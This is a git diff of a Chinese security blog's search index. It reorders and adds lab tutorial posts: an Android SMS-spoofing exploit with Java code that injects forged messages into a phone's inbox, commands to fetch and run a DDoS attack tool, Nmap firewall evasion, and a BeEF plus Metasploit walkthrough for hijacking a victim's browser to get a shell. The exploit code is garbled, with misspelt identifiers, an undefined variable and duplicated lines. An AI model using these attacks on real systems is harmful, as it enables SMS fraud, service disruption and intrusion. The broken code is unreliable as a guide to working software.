@@ -41,6 +41,47 @@
       </tags>
   </entry>
   <entry>
+    <title>Android安全之短信欺诈漏洞</title>
+    <url>/2021/12/27/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>目的：</p>
+<ul>
+<li>通过JAVA编程理解Android手机安全漏洞的基本原理</li>
+<li>用JAVA编写伪造短信代码，向系统收件箱发送伪造短信</li>
+</ul>
+<p>原理：</p>
+<ul>
+<li>漏洞原理介绍</li>
+<li>该系统漏洞能够使攻击者无需申请任何权限发送短信到用户收件箱。 出现该漏洞的原因是Android系统的com.android.mms.transaction。</li>
+<li>SmsReceiverService系统服务未判断启动服务的调用者，攻击者可以通过该应用发送伪装短信到用户收件箱。本漏洞实质上是一种能力的泄漏。</li>
+<li>漏洞发送的短信并不经过GSM网络,所以即使手机没有插sim卡,也照样可以收到短信,这让大部分的短信防火墙完全失效。</li>
+</ul>
+<p>过程：</p>
+<p>打开eclipse，点击file-import，选择android目录下的existing android code into workspace<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100046569.png" alt="image-20211229100046569"></p>
+<p>选择simpleedu28项目<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100118574.png" alt="image-20211229100118574"></p>
+<p>导入后的项目<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100200697.png" alt="image-20211229100200697"></p>
+<p>在工程目录res/layout的界面代码，这里可以通过控制代码，编辑相应的函数生成欺诈短信，点击activity_main.xml，可以看到界面布局的文件<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100257165.png" alt="image-20211229100257165"></p>
+<p>在mainactivity中添加运行欺诈短信的代码，点开<code>msgdemo2\src\com.example.msgdemol\mainactivity.java</code><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100406295.png" alt="image-20211229100406295"></p>
+<p>在mainactivity的init()函数添加如下代码，为button设置监听事件</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为发送按钮设置监听</span></span><br><span class="line">sendBt.setOnClickListener(<span class="keyword">new</span> OnClickListener()&#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                       <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 *获取输入的伪造号码和内</span></span><br><span class="line"><span class="comment">                 *判断输入是否合法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">String num=msgNumTv.getText().toString();</span><br><span class="line">String con=msgConTv.getText().toString();</span><br><span class="line">If(num.length()&lt;<span class="number">1</span>||con.length()&lt;<span class="number">1</span>)</span><br><span class="line">&#123; Toast.makeText(MainActivity.<span class="keyword">this</span>,”电话号码或者内容没有输入”,Toast.LENGTH_SHORT).show();</span><br><span class="line"><span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="comment">//判断通过伪造短信</span></span><br><span class="line"><span class="comment">//make Msg(MainActivity.this,num,con);</span></span><br><span class="line">createFakeMsg(MainActivity.<span class="keyword">this</span>,num,con);&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>在MainActivity的init()函数,跳转到init函数位置添加上一步的代码</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229101856123.png" alt="image-20211229101856123">createFakeMsg的具体代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *伪造短信</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> num</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> con</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createFakeMsg</span><span class="params">(Context context,String num,String con)</span></span>&#123;</span><br><span class="line">                <span class="keyword">byte</span>[] pdu=<span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">byte</span>[] scBytes=PhoneNumberUtils.networkPortionToCalledPartyBCD(num);</span><br><span class="line">                <span class="keyword">int</span> lsmcs=scBytes.length;</span><br><span class="line">                <span class="keyword">byte</span>[] dateBytes=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">7</span>];</span><br><span class="line">                Calendar calendar=<span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">                dateBytes[<span class="number">0</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.YEAR)));</span><br><span class="line">                dateBytes[<span class="number">1</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MONTH)+<span class="number">1</span>));</span><br><span class="line">                dateBytes[<span class="number">2</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.DAY_OF_MONTH)));</span><br><span class="line">                dateBytes[<span class="number">3</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.HOUR_OF_DAY)));</span><br><span class="line">                dateBytes[<span class="number">4</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MINUTE)));</span><br><span class="line">                dateBytes[<span class="number">5</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.SECOND)));</span><br><span class="line">                dateBytes[<span class="number">6</span>]=reverseByte((<span class="keyword">byte</span>)(（calendar.get(Caledar.ZONE_OFFSET)+calendar.get(Calendar.DST_OFFSET))/(<span class="number">60</span>*<span class="number">1000</span>*<span class="number">15</span>)）);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="comment">// Log.d(LOG,”test one”);</span></span><br><span class="line">                 ByteArrayOutputStream bo=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                 bo.write(lsmcs);</span><br><span class="line">                 bo.write(scBytes);</span><br><span class="line">                 bo.write(<span class="number">0x04</span>);</span><br><span class="line">                 bo.write((<span class="keyword">byte</span>)num.length());</span><br><span class="line">                 bo.write(senderBytes);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);<span class="comment">//encoding:0 for default 7bit</span></span><br><span class="line">                 bo.write(dateBytes);</span><br><span class="line">                 <span class="keyword">try</span>&#123;</span><br><span class="line">          String sReflectedClassName=”com.android.internal.telephony.GsmAlphabet”;</span><br><span class="line">          Class cRefectedNFCExtras=Class.forName(sReflectedClassName);</span><br><span class="line">          Method stringToGsm7BitPacketd=cReflectedNFCExtras.getMethod(“stringToGsm7BitPacketd”,<span class="keyword">new</span> Clas[]&#123;String.class&#125;);</span><br><span class="line">          stringToGsm7BitPacked.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">          <span class="keyword">byte</span>[] conbytes=(<span class="keyword">byte</span>[]) stringToGsm7BitPacked.invoke(<span class="keyword">null</span>,con);</span><br><span class="line">          bo.write(conbytes);</span><br><span class="line">          &#125;<span class="keyword">catch</span>(Exception e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          pdu=bo.toByteArray();&#125;</span><br><span class="line">          <span class="keyword">catch</span>(IOException e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          Intent intent=newIntent();</span><br><span class="line">          Intent.setClassName（“com.android.mms.transaction.SmsReceiverService”）;</span><br><span class="line">          Intent.setAction(“android.provider.Telephony.SMS_RECEIVED”);</span><br><span class="line">          Intent.putExtra(“pdus”,<span class="keyword">new</span> Object[]&#123;pdu&#125;);</span><br><span class="line">          <span class="comment">//intent.putExtra(“format”,”3gpp”);</span></span><br><span class="line">          Context.startService(intent);&#125;</span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="keyword">return</span> (<span class="keyword">byte</span>)((b&amp;<span class="number">0xf0</span>)&gt;&gt;<span class="number">4</span>|(b&amp;<span class="number">0x0f</span>)&lt;&lt;<span class="number">4</span>);&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在已经设计好的欺诈短信发送界面，有两部分内容：伪造号码与伪造内容。这里的伪造号码，这是发件人的号码，因为是发给自己，所以没有收件人号码，。至于内容可以随意填写内容，使短信更具欺诈性。</p>
+<p>AVD中打开虚拟机Simpleedu28虚拟安卓<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102354469.png" alt="image-20211229102354469"></p>
+<p>右键MSGDEMO2，选择run as-android application按钮<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102712162.png" alt="image-20211229102712162"></p>
+<p>虚拟端返回运行后结果<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102740838.png" alt="image-20211229102740838"></p>
+<p>点击发送，手机接收欺诈短信</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102848974.png" alt="image-20211229102848974"></p>
+]]></content>
+      <tags>
+        <tag>Android</tag>
+        <tag>短信</tag>
+        <tag>欺诈</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>APP加壳</title>
     <url>/2021/12/27/APP%E5%8A%A0%E5%A3%B3/</url>
     <content><![CDATA[<h2 id="APP加壳"><a href="#APP加壳" class="headerlink" title="APP加壳"></a>APP加壳</h2><p>目的：</p>
@@ -85,44 +126,15 @@
       </tags>
   </entry>
   <entry>
-    <title>Android安全之短信欺诈漏洞</title>
-    <url>/2021/12/27/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>目的：</p>
-<ul>
-<li>通过JAVA编程理解Android手机安全漏洞的基本原理</li>
-<li>用JAVA编写伪造短信代码，向系统收件箱发送伪造短信</li>
-</ul>
-<p>原理：</p>
-<ul>
-<li>漏洞原理介绍</li>
-<li>该系统漏洞能够使攻击者无需申请任何权限发送短信到用户收件箱。 出现该漏洞的原因是Android系统的com.android.mms.transaction。</li>
-<li>SmsReceiverService系统服务未判断启动服务的调用者，攻击者可以通过该应用发送伪装短信到用户收件箱。本漏洞实质上是一种能力的泄漏。</li>
-<li>漏洞发送的短信并不经过GSM网络,所以即使手机没有插sim卡,也照样可以收到短信,这让大部分的短信防火墙完全失效。</li>
-</ul>
-<p>过程：</p>
-<p>打开eclipse，点击file-import，选择android目录下的existing android code into workspace<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100046569.png" alt="image-20211229100046569"></p>
-<p>选择simpleedu28项目<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100118574.png" alt="image-20211229100118574"></p>
-<p>导入后的项目<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100200697.png" alt="image-20211229100200697"></p>
-<p>在工程目录res/layout的界面代码，这里可以通过控制代码，编辑相应的函数生成欺诈短信，点击activity_main.xml，可以看到界面布局的文件<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100257165.png" alt="image-20211229100257165"></p>
-<p>在mainactivity中添加运行欺诈短信的代码，点开<code>msgdemo2\src\com.example.msgdemol\mainactivity.java</code><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100406295.png" alt="image-20211229100406295"></p>
-<p>在mainactivity的init()函数添加如下代码，为button设置监听事件</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为发送按钮设置监听</span></span><br><span class="line">sendBt.setOnClickListener(<span class="keyword">new</span> OnClickListener()&#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                       <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 *获取输入的伪造号码和内</span></span><br><span class="line"><span class="comment">                 *判断输入是否合法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">String num=msgNumTv.getText().toString();</span><br><span class="line">String con=msgConTv.getText().toString();</span><br><span class="line">If(num.length()&lt;<span class="number">1</span>||con.length()&lt;<span class="number">1</span>)</span><br><span class="line">&#123; Toast.makeText(MainActivity.<span class="keyword">this</span>,”电话号码或者内容没有输入”,Toast.LENGTH_SHORT).show();</span><br><span class="line"><span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="comment">//判断通过伪造短信</span></span><br><span class="line"><span class="comment">//make Msg(MainActivity.this,num,con);</span></span><br><span class="line">createFakeMsg(MainActivity.<span class="keyword">this</span>,num,con);&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+    <title>DDos攻击</title>
+    <url>/2021/11/24/DDos%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h2 id="DDos攻击"><a href="#DDos攻击" class="headerlink" title="DDos攻击"></a>DDos攻击</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Ha3MrX/DDOs-Attack   # 下载工具</span><br><span class="line">vim ddos-attack.py</span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python2</span></span><br><span class="line">chmod +777 ddos-attack.py #直接使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>在MainActivity的init()函数,跳转到init函数位置添加上一步的代码</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229101856123.png" alt="image-20211229101856123">createFakeMsg的具体代码</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *伪造短信</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> num</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> con</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createFakeMsg</span><span class="params">(Context context,String num,String con)</span></span>&#123;</span><br><span class="line">                <span class="keyword">byte</span>[] pdu=<span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">byte</span>[] scBytes=PhoneNumberUtils.networkPortionToCalledPartyBCD(num);</span><br><span class="line">                <span class="keyword">int</span> lsmcs=scBytes.length;</span><br><span class="line">                <span class="keyword">byte</span>[] dateBytes=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">7</span>];</span><br><span class="line">                Calendar calendar=<span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">                dateBytes[<span class="number">0</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.YEAR)));</span><br><span class="line">                dateBytes[<span class="number">1</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MONTH)+<span class="number">1</span>));</span><br><span class="line">                dateBytes[<span class="number">2</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.DAY_OF_MONTH)));</span><br><span class="line">                dateBytes[<span class="number">3</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.HOUR_OF_DAY)));</span><br><span class="line">                dateBytes[<span class="number">4</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MINUTE)));</span><br><span class="line">                dateBytes[<span class="number">5</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.SECOND)));</span><br><span class="line">                dateBytes[<span class="number">6</span>]=reverseByte((<span class="keyword">byte</span>)(（calendar.get(Caledar.ZONE_OFFSET)+calendar.get(Calendar.DST_OFFSET))/(<span class="number">60</span>*<span class="number">1000</span>*<span class="number">15</span>)）);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="comment">// Log.d(LOG,”test one”);</span></span><br><span class="line">                 ByteArrayOutputStream bo=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                 bo.write(lsmcs);</span><br><span class="line">                 bo.write(scBytes);</span><br><span class="line">                 bo.write(<span class="number">0x04</span>);</span><br><span class="line">                 bo.write((<span class="keyword">byte</span>)num.length());</span><br><span class="line">                 bo.write(senderBytes);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);<span class="comment">//encoding:0 for default 7bit</span></span><br><span class="line">                 bo.write(dateBytes);</span><br><span class="line">                 <span class="keyword">try</span>&#123;</span><br><span class="line">          String sReflectedClassName=”com.android.internal.telephony.GsmAlphabet”;</span><br><span class="line">          Class cRefectedNFCExtras=Class.forName(sReflectedClassName);</span><br><span class="line">          Method stringToGsm7BitPacketd=cReflectedNFCExtras.getMethod(“stringToGsm7BitPacketd”,<span class="keyword">new</span> Clas[]&#123;String.class&#125;);</span><br><span class="line">          stringToGsm7BitPacked.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">          <span class="keyword">byte</span>[] conbytes=(<span class="keyword">byte</span>[]) stringToGsm7BitPacked.invoke(<span class="keyword">null</span>,con);</span><br><span class="line">          bo.write(conbytes);</span><br><span class="line">          &#125;<span class="keyword">catch</span>(Exception e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          pdu=bo.toByteArray();&#125;</span><br><span class="line">          <span class="keyword">catch</span>(IOException e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          Intent intent=newIntent();</span><br><span class="line">          Intent.setClassName（“com.android.mms.transaction.SmsReceiverService”）;</span><br><span class="line">          Intent.setAction(“android.provider.Telephony.SMS_RECEIVED”);</span><br><span class="line">          Intent.putExtra(“pdus”,<span class="keyword">new</span> Object[]&#123;pdu&#125;);</span><br><span class="line">          <span class="comment">//intent.putExtra(“format”,”3gpp”);</span></span><br><span class="line">          Context.startService(intent);&#125;</span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="keyword">return</span> (<span class="keyword">byte</span>)((b&amp;<span class="number">0xf0</span>)&gt;&gt;<span class="number">4</span>|(b&amp;<span class="number">0x0f</span>)&lt;&lt;<span class="number">4</span>);&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在已经设计好的欺诈短信发送界面，有两部分内容：伪造号码与伪造内容。这里的伪造号码，这是发件人的号码，因为是发给自己，所以没有收件人号码，。至于内容可以随意填写内容，使短信更具欺诈性。</p>
-<p>AVD中打开虚拟机Simpleedu28虚拟安卓<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102354469.png" alt="image-20211229102354469"></p>
-<p>右键MSGDEMO2，选择run as-android application按钮<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102712162.png" alt="image-20211229102712162"></p>
-<p>虚拟端返回运行后结果<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102740838.png" alt="image-20211229102740838"></p>
-<p>点击发送，手机接收欺诈短信</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102848974.png" alt="image-20211229102848974"></p>
 ]]></content>
       <tags>
-        <tag>Android</tag>
-        <tag>短信</tag>
-        <tag>欺诈</tag>
+        <tag>ddos</tag>
+        <tag>python</tag>
+        <tag>kali</tag>
       </tags>
   </entry>
   <entry>
@@ -165,18 +177,6 @@
       </tags>
   </entry>
   <entry>
-    <title>DDos攻击</title>
-    <url>/2021/11/24/DDos%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h2 id="DDos攻击"><a href="#DDos攻击" class="headerlink" title="DDos攻击"></a>DDos攻击</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Ha3MrX/DDOs-Attack   # 下载工具</span><br><span class="line">vim ddos-attack.py</span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python2</span></span><br><span class="line">chmod +777 ddos-attack.py #直接使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>ddos</tag>
-        <tag>python</tag>
-        <tag>kali</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Nmap简单使用</title>
     <url>/2021/11/24/Nmap%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h2 id="Nmap简单使用"><a href="#Nmap简单使用" class="headerlink" title="Nmap简单使用"></a>Nmap简单使用</h2><h3 id="躲避防火墙，分组发送报文"><a href="#躲避防火墙，分组发送报文" class="headerlink" title="躲避防火墙，分组发送报文"></a>躲避防火墙，分组发送报文</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -f -v 127.0.0.1</span><br></pre></td></tr></table></figure>
@@ -196,6 +196,59 @@
 ]]></content>
       <tags>
         <tag>nmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>beef+metasploit利用浏览器获取shell</title>
+    <url>/2021/12/20/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/</url>
+    <content><![CDATA[<h2 id="beef-metasploit利用浏览器获取shell"><a href="#beef-metasploit利用浏览器获取shell" class="headerlink" title="beef+metasploit利用浏览器获取shell"></a>beef+metasploit利用浏览器获取shell</h2><h3 id="利用beef获得目标主机shell"><a href="#利用beef获得目标主机shell" class="headerlink" title="利用beef获得目标主机shell"></a>利用beef获得目标主机shell</h3><h4 id="原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。"><a href="#原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。" class="headerlink" title="原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。"></a>原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。</h4><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，将beef和metasploit进行关联，终端进入<code>beef-xss</code>目录，编辑文件<code>config.yaml</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195046684.png" alt="image-20211220195046684"></p>
+<p>将文件中metasploit的<code>enable</code>的<code>false</code>修改为<code>true</code>,保存退出</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195427947.png" alt="image-20211220195427947"></p>
+<p>进入 /usr/share/beef-xss/extensions/metasploit/目录，编辑<code>config.yaml</code>文件，把<code>host</code>的参数跟<code>callback_host</code>参数修改成kali主机ip</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195701762.png" alt="image-20211220195701762"></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195837527.png" alt="image-20211220195837527"></p>
+<p>将<code>custom path</code>的路径修改为 <code>/usr/share/metasploit-framework/</code>，保存退出</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200034953.png" alt="image-20211220200034953"></p>
+<p>输入命令<code>/etc/init.d/postgresql start</code>，启动postgresql服务，输入命令<code>msfdb init</code>，初始化数据库</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200335286.png" alt="image-20211220200335286"></p>
+<p>终端中输入msfconsole，启动metasploit，输入<code>load msgrpc ServerHost=ip Pass=abc123</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200632568.png" alt="image-20211220200632568"></p>
+<p>打开新终端，输入cd /usr/share/beef-xss/，切换到beef-xss目录下，输入<code>./beef –x</code>加载模块</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200906579.png" alt="image-20211220200906579"></p>
+<p>打开浏览器，输入<code>http://ip:3000/ui/panel</code>，访问<code>beef</code>，账号密码都是<code>beef</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201119958.png" alt="image-20211220201119958"></p>
+<p>在靶机访问<code>http://ip:3000/demos/butcher/index.html</code></p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201335685.png" alt="image-20211220201335685"></p>
+<p>返回kali,看到beef自动连接客户端，提示目标已上线</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201458346.png" alt="image-20211220201458346"></p>
